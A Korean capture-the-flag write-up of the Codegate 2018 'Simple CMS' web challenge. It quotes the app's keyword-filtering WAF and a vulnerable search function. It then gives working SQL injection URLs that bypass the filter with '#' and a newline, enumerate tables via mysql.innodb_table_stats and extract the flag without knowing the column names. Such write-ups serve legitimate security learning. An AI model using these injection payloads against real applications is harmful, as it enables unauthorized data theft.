# [WEB] Codegate 2018 Quals - Simple CMS

## Description

Just Source File

[Download](https://s3.ap-northeast-2.amazonaws.com/codegate2018/fbbc0672fb3688a554ddb76e95c4971b)

## Analysis

문제에서 Simple CMS설치를 할 수 있는 소스를 다운받을 수 있다.

소스를 열어보면 `simple_cms.sql`파일안에 플래그가 박혀있는 것을 확인할 수 있다.

```sql
INSERT INTO `{table_prefix}flag` (`{blind_column}1`, `{blind_column}2`, `{blind_column}3`, `{blind_column}4`) VALUES
('', '', 'flag{flagflagflagffagflaglfaglfag}', '');
```

결국 인젝션 문제인 것 같다.

기본적으로 이 문제는 `functions/waf.php` 파일에 의해 필터링이 되어진다.

```php
if(!defined('simple_cms')) exit();

$method = $_SERVER['REQUEST_METHOD'];

if($method !== 'GET' && $method !== 'POST'){
  exit('are you hacker?');
}

$filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into');

function escape_str($array)
{
  if(is_array($array)) {
    foreach($array as $key => $value) {
      if(is_array($value)) {
        $array[$key] = escape_str($value);
      } else {
        $array[$key] = filter($value);
      }
    }
  } 
  else {
    $array = filter($array);
  }
  return $array;
}
function filter($str){
  global $filter_str;

  foreach ($filter_str as $value) {
    if(stripos($str, $value) !== false){
      die('are you hacker?');
    }
  }
  return addslashes($str);
}

$_GET = escape_str($_GET);
$_POST = escape_str($_POST);
$_COOKIE = escape_str($_COOKIE);
$_REQUEST = escape_str($_REQUEST);	
```

SQL관련 문자열 필터링은 별거 없지만 addslashes가 추가되어 quote(')를 사용할 수 없다.

취약한 부분을 찾던 중 누가봐도 취약한 소스를 발견하였다.

`classes/Board.class.php:24` 

```php
function action_search(){
  $column = Context::get('col');
  $search = Context::get('search');
  $type = strtolower(Context::get('type'));
  $operator = 'or';

  if($type === '1'){
  	$operator = 'or';
  }
  else if($type === '2'){
  	$operator = 'and';
  }
  if(preg_match('/[\<\>\'\"\\\'\\\"\%\=\(\)\/\^\*\-`;,.@0-9\s!\?\[\]\+_&$]/is', $column)){
  	$column = 'title';
  }
  $query = get_search_query($column, $search, $operator);
  $result = DB::fetch_multi_row('board', '', '', '0, 10','date desc', $query);
  include(CMS_SKIN_PATH . 'board.php');
}
```

`functions/lib.php:16`

```Php
function get_search_query($column, $search, $operator){
	$column = explode('|', $column);
	$result = '';
	for($i=0; $i<count($column); $i++){
		if(trim($column[$i]) === ''){
			continue;				
		}
		$result .= " LOWER({$column[$i]}) like '%{$search}%' {$operator}";
	}
	$result = trim(substr($result, 0 , strrpos($result, $operator)));
	return $result;
}
```

col 인자로 받는 값은 Quote안에 들어가지 않고 괄호에 들어가는데 col의 경우 필터링이 매우 빡세다.

하지만 우리는 #을 쓸 수가 있다.

이를 이용하여 인젝션을 할 수 있었다.

## Exploit

### SQL Injection

col에 #을 넣고 search에 개행문자(%0a)를 삽입하여 보내게 되면 다음과 같이 쿼리가 만들 수 있다.

```
​~~~~ LOWER(0#) like '%
) && 1 #%'
```

이제 union을 이용해 테이블을 뽑아보자.

information_schema를 못쓰니 mysql의 innodb_table_stats를 사용하자.

```
http://13.125.3.183/?act=board&mid=search&col=%23|&type=1&search=%0a0)%20union%20select%201,database_name,table_name,table_name,5%20from%20mysql.innodb_table_stats%20%23

idx	title	id
1	mysql	gtid_executed
1	simple_cms	41786c497656426a6149_board
1	simple_cms	41786c497656426a6149_flag
1	simple_cms	41786c497656426a6149_users
1	sys	sys_config
```

하지만 컬럼은 알아내는 것이 불가는하기에 컬럼을 모르는 상태에서 데이터를 뽑아야한다.

최종적으로 완선된 쿼리는 다음과 같다.

```
http://13.125.3.183/?act=board&mid=search&col=%23|&type=1&search=%0a0)%20union%20select%201,2,1,a,1%20from%20(select%201,2,3%20a,4%20union%20select%20*%20from%2041786c497656426a6149_flag%20limit%201,1)a%23

idx	title	id
1	2	flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}
```



**flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}**